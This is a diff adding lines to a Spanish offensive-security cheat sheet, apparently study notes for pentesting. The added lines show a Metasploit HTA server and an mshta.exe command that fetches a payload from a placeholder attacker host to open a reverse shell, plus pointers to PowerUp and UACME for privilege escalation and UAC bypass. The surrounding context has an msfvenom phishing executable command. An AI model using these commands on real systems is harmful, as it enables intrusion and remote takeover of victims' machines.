@@ -636,6 +636,16 @@ $ script -qc /bin/bash /dev/null
 		- **`run post/multi/recon/local_exploit_suggester`:** Para ver que podemos usar para subir privilegios
 		- **`run post/windows/manage/enable_rdp`:** Para abrir el control de escritorio remoto
 		- **`run autoroute -h`:** Permite usar como gateway la máquina victima para acceder a otras partes de la red
+	- Para obtener una reverse shell directamente con una petición del navegador:
+	  ```
+	  # En Metasploit
+	  use exploit/windows/misc/hta_server
+	  set LHOST 443 # Opciona, puede ayudar en ocasiones
+	  exploit
+
+	  # En la victima
+	  mshta.exe http://<IP_ATACANTE>:8080/<NOMBRE_GENERADO>.hpa
+	  ```
 	- Veamos como crear una reverve shell con un payload staged (Necesitará un handler especifico pero será más pequeño) utilizando phishing a un sistema Windows:
 		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
 		2. Deberemos ahora lanzar Metasploit y esperar a que alguien ejecute el archivo creado antes:
@@ -684,6 +694,8 @@ $ script -qc /bin/bash /dev/null
 
 		   [*] Exploit running as background job.
 		   ```
+	- [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1): Es un módulo de Poweshell que contiene diferentes utilidades para escalar privilegios, importandolo al módulo de Powershell de Meterpreter es muy potente
+	- Si el comando `getsystem` de Meterpreter no consigue escalar puede que se necesite hace un bypass a UAC. En Metasploit hay algunos módulos que podrían ayudar con esto, usa el módulo `post/multi/recon/local_exploit_suggester` para comprobar si alguno vale. En caso de no poder realizar el bypass con Metasploit, siempre queda [UACME](https://github.com/hfiref0x/UACME)
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
 - [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)**:** SessionGopher es una herramienta de PowerShell que busca y descodifica sesiones guardadas para herramientas de acceso remoto
